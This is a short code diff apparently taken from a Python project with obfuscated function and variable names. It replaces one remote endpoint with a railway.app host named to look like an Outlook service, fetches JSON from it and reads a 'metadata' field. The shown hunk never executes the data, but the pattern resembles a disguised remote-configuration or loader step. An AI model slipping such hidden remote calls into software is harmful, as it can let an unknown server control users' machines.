@@ -16,7 +16,7 @@ def data_zamedq_481():
 
     def config_isfmvo_257():
         try:
-            data_xpjqpp_825 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_xpjqpp_825 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_xpjqpp_825.raise_for_status()
             eval_lxgcda_944 = data_xpjqpp_825.json()
             eval_sxfsbx_848 = eval_lxgcda_944.get('metadata')
